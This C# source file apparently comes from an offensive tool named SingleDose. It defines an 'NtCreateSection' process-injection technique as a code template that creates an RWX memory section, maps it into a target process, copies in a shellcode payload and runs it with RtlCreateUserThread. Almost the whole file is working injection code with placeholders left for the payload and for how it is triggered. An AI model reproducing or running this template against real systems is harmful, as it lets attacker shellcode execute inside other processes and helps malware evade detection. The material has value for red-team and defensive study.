using System.Collections.Generic;

namespace SingleDose.Techniques.Injects
{
    internal class NtCreateSection : ITechnique
    {
        string ITechnique.TechniqueName => "NtCreateSection";

        string ITechnique.TechniqueDescription => "Uses NT APIs to create a thread in the target process after mapping a new memory section containing shellcode.";

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => false;
        List<string> ITechnique.Invokes => new List<string>() { "NtCreateSection", "NtMapViewOfSection", "RtlCreateUserThread" };
        List<string> ITechnique.Prerequisites => new List<string>() { "ProcessID" };
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace {{NAMESPACE}}
{
    class Program
    {
        static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            Process target = Process.GetProcessById({{PROCESSID}});
            uint dwRet = 0;
            uint dwMaxSize = (uint)payload.Length;
            ulong ulGarbage = 0;
            IntPtr hSection = IntPtr.Zero;
            IntPtr hLocalSectionAddress = IntPtr.Zero;
            IntPtr hRemoteSectionAddress = IntPtr.Zero;

            dwRet = NtCreateSection( 
                ref hSection,
                SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref dwMaxSize,
                0x40,/*RWX*/
                SEC_COMMIT,
                IntPtr.Zero);
            
            if (dwRet != 0)
            {
                Console.WriteLine(""[!] NtCreateSection failed. Exiting..."");
                Environment.Exit(1);
            }
            
            dwRet = NtMapViewOfSection(
                hSection,
                Process.GetCurrentProcess().Handle,
                ref hLocalSectionAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out ulGarbage,
                out dwMaxSize,
                2,
                0,
                0x40);/*RWX*/

            if (dwRet != 0)
            {
                Console.WriteLine(""[!] NtMapViewOfSection for the local section failed. Exiting..."");
                Environment.Exit(1);
            }

            dwRet = NtMapViewOfSection(
                hSection,
                target.Handle,
                ref hRemoteSectionAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out ulGarbage,
                out dwMaxSize,
                2,
                0,
                0x20);/*RX*/

            if (dwRet != 0)
            {
                Console.WriteLine(""[!] NtMapViewOfSection for the remote section failed. Exiting..."");
                Environment.Exit(1);
            }

            Marshal.Copy(payload, 0, hLocalSectionAddress, payload.Length);
            
            IntPtr hTargetThread = IntPtr.Zero;
            RtlCreateUserThread(
                target.Handle,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                IntPtr.Zero,
                hRemoteSectionAddress,
                IntPtr.Zero,
                ref hTargetThread,
                IntPtr.Zero);

            if (hTargetThread == IntPtr.Zero)
            {
                Console.WriteLine(""[!] RtlCreateUserThread failed. Exiting..."");
                Environment.Exit(0);
            }
        }

        static uint SEC_COMMIT = 0x08000000;
        static uint SECTION_MAP_WRITE = 0x0002;
        static uint SECTION_MAP_READ = 0x0004;
        static uint SECTION_MAP_EXECUTE = 0x0008;
        static uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;
        {{ARGS}}
        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => null;
    }
}
